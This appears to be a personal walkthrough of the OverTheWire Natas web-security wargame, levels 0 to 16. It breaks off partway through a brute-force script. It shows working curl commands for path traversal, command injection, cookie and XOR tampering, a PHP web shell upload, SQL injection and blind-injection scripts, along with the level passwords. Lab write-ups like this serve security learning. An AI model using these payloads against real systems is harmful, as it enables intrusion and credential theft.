-- Natas Challenges --

# Level 0:
Just read the html using curl and grepping the password:

```
abs@MacBookPro ~ % curl http://natas0.natas.labs.overthewire.org -u natas0:natas0 -s | grep password
You can find the password for the next level on this page.
<!--The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->
```


# Level 0 -> 1:

Using the cred from the prev level:
```
abs@MacBookPro ~ % curl http://natas1.natas.labs.overthewire.org -u natas1:0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -s | grep pass
<script>var wechallinfo = { "level": "natas1", "pass": "0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq" };</script></head>
You can find the password for the
<!--The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -->
```


# Level 1 -> 2:
```
abs@MacBookPro ~ % curl http://natas2.natas.labs.overthewire.org -u natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI               
...
<body>
<h1>natas2</h1>
<div id="content">
There is nothing on this page
<img src="files/pixel.png">
</div>
</body></html>
```

```
abs@MacBookPro ~ % curl http://natas2.natas.labs.overthewire.org/files/ -u natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -s | grep href 
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="pixel.png">pixel.png</a></td><td align="right">2025-08-15 13:06  </td><td align="right">303 </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="users.txt">users.txt</a></td><td align="right">2025-08-15 13:06  </td><td align="right">145 </td><td>&nbsp;</td></tr>
```

```
abs@MacBookPro ~ % curl http://natas2.natas.labs.overthewire.org/files/users.txt -u natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI 
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```


# Level 2 -> 3:
```
abs@MacBookPro ~ % curl http://natas3.natas.labs.overthewire.org -u natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH -s            
...
<h1>natas3</h1>
<div id="content">
There is nothing on this page
<!-- No more information leaks!! Not even Google will find it this time... -->
</div>
</body></html>
```

```
abs@MacBookPro ~ % curl http://natas3.natas.labs.overthewire.org/robots.txt -u natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH -s 
User-agent: *
Disallow: /s3cr3t/
```

```
abs@MacBookPro ~ % curl http://natas3.natas.labs.overthewire.org/s3cr3t/ -u natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH -s 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /s3cr3t</title>
 </head>
 <body>
<h1>Index of /s3cr3t</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="users.txt">users.txt</a></td><td align="right">2025-08-15 13:06  </td><td align="right"> 40 </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.58 (Ubuntu) Server at natas3.natas.labs.overthewire.org Port 80</address>
</body></html>
```
```
abs@MacBookPro ~ % curl http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt -u natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH -s  
natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```


# Level 3 -> 4:
```
abs@MacBookPro ~ % curl http://natas4.natas.labs.overthewire.org -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ -s   
...
<h1>natas4</h1>
<div id="content">

Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
```

```
abs@MacBookPro ~ % curl natas4.natas.labs.overthewire.org/index.php -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ -H "Referer: http://natas5.natas.labs.overthewire.org/" -s
...
<h1>natas4</h1>
<div id="content">

Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
```

# Level 4 -> 5:
```
abs@MacBookPro ~ % curl natas5.natas.labs.overthewire.org -u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK -s
...
<h1>natas5</h1>
<div id="content">
Access disallowed. You are not logged in</div>
</body>
</html>
```

```
abs@MacBookPro ~ % curl natas5.natas.labs.overthewire.org -u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK -i | grep Cookie
Set-Cookie: loggedin=0
```

```
abs@MacBookPro ~ % curl natas5.natas.labs.overthewire.org -u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK -i -H "Cookie: loggedin=1" 
...
Set-Cookie: loggedin=1
...
<h1>natas5</h1>
<div id="content">
Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned</div>
```



# Level 5 -> 6:

```
abs@MacBookPro ~ % curl natas6.natas.labs.overthewire.org -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned -s                                                                        
...
<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

index-source.html:
```
include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

```
abs@MacBookPro ~ % curl natas6.natas.labs.overthewire.org/includes/secret.inc -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned -s 
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

```
abs@MacBookPro ~ % curl natas6.natas.labs.overthewire.org -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned -s -d "secret=FOEIUWGHFEEUHOFUOIU&submit=no_one_cares" | grep "Access granted"ess granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
```


# Level 6 -> 7:
```
abs@MacBookPro ~ % curl natas7.natas.labs.overthewire.org -u natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS -s 
...
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
```

```
abs@MacBookPro ~ % curl "natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8" -u natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS -s
...
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>
```


# Level 7 -> 8:

```
abs@MacBookPro ~ % curl "natas8.natas.labs.overthewire.org/" -u natas8:xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q -s
...
<h1>natas8</h1>
<div id="content">


<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

index-source.html
```
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

some calc:
```
bin2hex(strrev(base64_encode($secret))) = "3d3d516343746d4d6d6c315669563362"
strrev(base64_encode($secret)) = hex2bin("3d3d516343746d4d6d6c315669563362")
base64_encode($secret) = strrev(hex2bin("3d3d516343746d4d6d6c315669563362"))
$secret = base64_deccode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362")))
```


```
abs@MacBookPro ~ % python3 -c "import base64; h='3d3d516343746d4d6d6c315669563362'; print(base64.b64decode(bytes.fromhex(h)[::-1]))"
b'oubWYf2kBq'
```

```
abs@MacBookPro ~ % curl "natas8.natas.labs.overthewire.org/" -u natas8:xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q -s -d "secret=oubWYf2kBq&submit=" | grep "Access granted"
Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
```


# Level 8 -> 9:
```
abs@MacBookPro ~ % curl "natas9.natas.labs.overthewire.org/" -u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t -s                                                     
<h1>natas9</h1>
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


```
abs@MacBookPro ~ % curl "natas9.natas.labs.overthewire.org/" -u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t -s -d "needle=hello & submit="                           
<h1>natas9</h1>
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
hello
hello's
hellos
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

index-source.html:
```
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
```


I would like to run something like: "grep -i . /etc/natas_webpass/natas" so...
```
abs@MacBookPro ~ % curl "natas9.natas.labs.overthewire.org/" -u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t -s -d "needle=. /etc/natas_webpass/natas10; file  & submit="
Output:
<pre>
t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
dictionary.txt: Unicode text, UTF-8 text
</pre>
```


# Level 9 -> 10:
```
abs@MacBookPro ~ % curl "natas10.natas.labs.overthewire.org/" -u natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu -s                                                 
For security reasons, we now filter on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

index-source.html:
```
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
</pre>
```

lol this should be easy, I guess they want me to use cat or something the prev level..

```
abs@MacBookPro ~ % curl "natas10.natas.labs.overthewire.org/" -u natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu -s -d "needle=. /etc/natas_webpass/natas11 --exclude  & submit="
Output:
<pre>
UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
</pre>
```


# Level 10 -> 11:
```
abs@MacBookPro ~ % curl "natas11.natas.labs.overthewire.org/" -u natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk -s                                                       
<h1>natas11</h1>
<div id="content">
<body style="background: #ffffff;">
Cookies are protected with XOR encryption<br/><br/>


<form>
Background color: <input name=bgcolor value="#ffffff">
<input type=submit value="Set color">
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

index-source.html:
```
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);
?>

<h1>natas11</h1>
<div id="content">
<body style="background: <?=$data['bgcolor']?>;">
Cookies are protected with XOR encryption<br/><br/>

<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}
?>

<form>
Background color: <input name=bgcolor value="<?=$data['bgcolor']?>">
<input type=submit value="Set color">
</form>
```

```
abs@MacBookPro ~ % curl "natas11.natas.labs.overthewire.org/" -u natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk -i  | grep Cookie
Set-Cookie: data=HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJV3djTRg%3D
Cookies are protected with XOR encryption<br/><br/>
```

```

abs@MacBookPro ~ % echo 'HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D' | python3 -c "import sys,urllib.parse;print(urllib.parse.unquote(sys.stdin.read().strip()))"            
HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=
```

array ^ key = data

key = array ^ data 

```
abs@MacBookPro ~ % echo 'HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D' | python3 -c "import sys,urllib.parse;print(urllib.parse.unquote(sys.stdin.read().strip()))" | base64 -d > data@MacBookPro ~ % python3 -c 'import json; print(json.dumps({"showpassword":"no","bgcolor":"#ffffff"}))' > array                                                                @MacBookPro ~ % python3 - <<'EOF' open("data","rb").read()
b = open("array","rb").read()

print(bytes([x ^ b[i % len(b)] for i, x in enumerate(a)]))
EOF
b'eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe
```

So the key is "eDWo".
Thus, the new cookie value should be: "eDWo" ^ {"showpassword":"yes","bgcolor":"#ffffff"}

```
abs@MacBookPro ~ % python3 - <<'EOF' '{"showpassword":"yes","bgcolor":"#ffffff"}'.encode()  # default UTF-8
b = "eDWo".encode()  # default UTF-8
res = bytes([x ^ b[i % len(b)] for i, x in enumerate(a)])
import base64

print(base64.b64encode(res).decode())
EOF
HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5
```

```
abs@MacBookPro ~ % curl "natas11.natas.labs.overthewire.org/" -u natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk -i -H "Cookie: data=HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5" 
<h1>natas11</h1>
<div id="content">
<body style="background: #ffffff;">
Cookies are protected with XOR encryption<br/><br/>

The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB<br>
```


# Level 11 -> 12:
```
abs@MacBookPro OverTheWire % curl "natas12.natas.labs.overthewire.org/" -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB -s
<body>
<h1>natas12</h1>
<div id="content">

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="hzxjlqm5f1.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

index-source.html:
```
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<?php } ?>
```

Let's create a php file, that will read the "/etc/natas_webpass/natas13":

```
abs@MacBookPro OverTheWire % cat > nani.php <<'EOF'
<?php
echo shell_exec("cat /etc/natas_webpass/natas13");
?>
EOF
```

```
abs@MacBookPro OverTheWire % curl "natas12.natas.labs.overthewire.org/" -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB -s -F "filename=nani.php" -F "uploadedfile=@nani.php"
...
<h1>natas12</h1>
<div id="content">
The file <a href="upload/9kxythwuv7.php">upload/9kxythwuv7.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

```
abs@MacBookPro OverTheWire % curl "natas12.natas.labs.overthewire.org/upload/9kxythwuv7.php" -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB -s                              
trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```


# Level 12 -> 13:

```
abs@MacBookPro OverTheWire % curl "natas13.natas.labs.overthewire.org/" -u natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC -s 
...
<h1>natas13</h1>
<div id="content">
For security reasons, we now only accept image files!<br/><br/>


<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="460bkiwv0q.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

index-source.html:
```
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<?php } ?>
```


Same as the prev level, but I actually need to convince it that my file is an image...
From https://www.php.net/manual/en/function.exif-imagetype.php:
"When a correct signature is found, the appropriate constant value will be returned otherwise the return value is false"
So it's not checking the extension, but the header's magic...
According to wiki, the magic is "FF D8 FF EE".

```
abs@MacBookPro OverTheWire % echo '\xFF\xD8\xFF' > nani.php && cat >> nani.php <<'EOF'
<?php
echo shell_exec("cat /etc/natas_webpass/natas14");
?>
EOF
```

```
abs@MacBookPro OverTheWire % curl "natas13.natas.labs.overthewire.org/" -u natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC -s -F "filename=nani.php" -F "uploadedfile=@nani.php" | grep php
The file <a href="upload/gavovcbgos.php">upload/gavovcbgos.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

```
abs@MacBookPro OverTheWire % curl "natas13.natas.labs.overthewire.org/upload/gavovcbgos.php" -u natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC -s 
???
z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
```


# Level 13 -> 14:
```
abs@MacBookPro OverTheWire % curl "natas14.natas.labs.overthewire.org/" -u natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ -s  
...
<h1>natas14</h1>
<div id="content">

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

index-source.html:
```
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<?php } ?>
```

SQL lesgooo

Let's see how the query is actually looks like:

```
abs@MacBookPro OverTheWire % curl "natas14.natas.labs.overthewire.org/index.php?debug=1" -u natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ -s -F "username=art" -F "password=vandelay"
...
<h1>natas14</h1>
<div id="content">
Executing query: SELECT * from users where username="art" and password="vandelay"<br>Access denied!<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

```
abs@MacBookPro OverTheWire % curl "natas14.natas.labs.overthewire.org/index.php?debug=1" -u natas14:z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ -s -F "username=Vandelay\" OR 0=0 -- \""
...
<b>Notice</b>:  Undefined index: password in <b>/var/www/natas/natas14/index.php</b> on line <b>19</b><br />
Executing query: SELECT * from users where username="Vandelay" OR 0=0 -- "" and password=""<br>Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```


# Level 14 -> 15:
```
abs@MacBookPro OverTheWire % curl "natas15.natas.labs.overthewire.org/" -u natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx -s                                     
<h1>natas15</h1>
<div id="content">

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

index-source.html:
```
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<?php } ?>
```


```
abs@MacBookPro OverTheWire % curl "natas15.natas.labs.overthewire.org/index.php?debug=1" -u natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx -s -F "username=natas16"
...
<h1>natas15</h1>
<div id="content">
Executing query: SELECT * from users where username="natas16"<br>This user exists.<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```



```
abs@MacBookPro OverTheWire % curl "natas15.natas.labs.overthewire.org/index.php?debug=1" -u natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx -s -F "username=natas15\" OR 0=0 --\""
...
<h1>natas15</h1>
<div id="content">
Executing query: SELECT * from users where username="natas15" OR 0=0 --""<br>This user exists.<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
```

Brute-forcing the password:
```
#!/bin/bash

CHARS="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
PASS_LEN=32
URL="natas15.natas.labs.overthewire.org/index.php"
LOGIN="natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"
PASS=""

for pos in $(seq 1 $PASS_LEN); do
	for char in $(echo $CHARS | fold -w1); do
		OUT=$(curl $URL -u $LOGIN -s -F "username=natas16\" AND BINARY SUBSTRING(password,$pos,1)=\"$char\" -- \"" | grep "This user exists" | wc -l)
		if [ "$OUT" -eq 1 ]; then
			PASS+=$char
			echo "pass so far: $PASS"
			break
		fi
	done
done

echo "Password for natas16: $PASS"
```

```
abs@MacBookPro OverTheWire % chmod +x brute_force_natas15.sh s@MacBookPro OverTheWire % ./brute_force_natas15.sh 
Password for natas16: hpkjkyvilqctew33qmuxl6edvfmw4sgo
```

IF FAILS!!! because it's all LC?! fml

Added BINARY infront if SUBSTRING for binary conversion before comp..
```
abs@MacBookPro OverTheWire % ./brute_force_natas15.sh 
Password for natas16: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
```


# Level 15 -> 16:
```
abs@MacBookPro OverTheWire % curl "natas16.natas.labs.overthewire.org/" -u natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo -s
<h1>natas16</h1>
<div id="content">

For security reasons, we now filter even more on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
```

index-source.html:
```
Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```


I have an awful idea...

```
abs@MacBookPro OverTheWire % curl "natas16.natas.labs.overthewire.org/" -u natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo -s -d "needle=\$(grep 3 /etc/natas_webpass/natas17)hello&submit="
Output:
<pre>
hello
hello's
hellos
</pre>
```

Let's do some scripting:
```
#!/bin/bash

CHARS="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
URL="natas16.natas.labs.overthewire.org"
LOGIN="natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"
PASS=""

for char in $(echo $CHARS | fold -w1); do
	OUT=$(curl $URL -u $LOGIN -s -d "needle=\$(grep $char /etc/natas_webpass/natas17)hello&submit=" | grep "hellos" | wc -l)
	if [ "$OUT" -eq 0 ]; then
		PASS+=$char
		echo "pass so far: $PASS"
	fi
done

echo "Password for natas16: $PASS"
```

The chars used in the password are:

```
abs@MacBookPro OverTheWire % ./brute_force_natas16.sh
Password for natas16: bhjkoqsvwCEFHJLNOT05789
```

I need to know what is the first char in the passowrd, so I could bruteforce it...

```
abs@MacBookPro OverTheWire % curl "natas16.natas.labs.overthewire.org/" -u natas16:hPkjKYviLQctEW33QmuXL6eDVfMW4sGo -s -d "needle=\$(cut -c 1 /etc/natas_webpass/natas17)&submit=" | grep  -x .
E
```

So, it is either e or E, but the chars are bhjkoqsvwCEFHJLNOT05789 so it starts with E !!!

Let's do the bruteforcing:
```
#!/bin/bash

CHARS="bhjkoqsvwCEFHJLNOT05789"
URL="natas16.natas.labs.overthewire.org"
